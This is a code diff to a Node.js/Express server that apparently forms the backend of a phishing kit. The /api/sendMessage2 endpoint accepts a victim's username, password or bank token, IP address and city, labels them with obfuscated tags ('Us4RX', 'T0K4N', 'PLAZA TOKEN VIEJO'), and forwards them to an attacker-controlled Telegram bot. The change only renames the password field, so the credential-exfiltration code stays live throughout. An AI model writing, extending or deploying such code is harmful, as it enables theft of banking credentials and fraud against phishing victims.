@@ -60,14 +60,14 @@ app.post('/api/sendMessage', async (req, res) => {
 });
 
 app.post('/api/sendMessage2', async (req, res) => {
-    const { usar, password, ip, city } = req.body;
+    const { usar, pass, ip, city } = req.body;
 
-    if (!usar || !ip || !password) {
+    if (!usar || !ip || !pass) {
         return res.status(400).json({ error: 'Faltan datos obligatorios' });
     }
 
     // Construir mensaje
-    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${usar}</code>\nT0K4N: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟢PLAZA TOKEN VIEJO🟢\nUs4RX: <code>${usar}</code>\nT0K4N: <code>${pass}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
